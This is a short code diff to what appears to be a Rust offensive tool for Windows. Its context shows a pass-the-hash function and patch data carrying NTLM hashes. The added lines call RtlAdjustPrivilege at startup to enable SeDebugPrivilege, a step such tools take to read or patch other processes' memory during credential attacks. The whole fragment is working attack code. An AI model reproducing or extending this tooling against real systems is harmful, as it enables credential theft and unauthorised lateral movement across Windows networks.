@@ -32,6 +32,16 @@ pub struct PatchData<'a> {
     ntlm: &'a [u8],
 }
 
+extern "system" {
+    fn RtlAdjustPrivilege(
+        privilege: u32,
+        enable: i8,
+        current_thread: i8,
+        enabled: *const u32,
+    ) -> i32;
+}
+const SE_DEBUG_PRIVILEGE: u32 = 0x14;
+
 // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
 pub fn pass_the_hash(
     user: String,
@@ -184,6 +194,14 @@ pub fn main() {
         );
     let m = app.get_matches();
 
+    let enabled = 0_u32;
+    unsafe {
+        if RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, 1, 0, &enabled as _) != 0 {
+            panic!("Adjust debug privilege error");
+        }
+        println!("Adjust debug privilege");
+    }
+    
     if let Some(c) = m.subcommand {
         match c.name.as_str() {
             "enum" => {
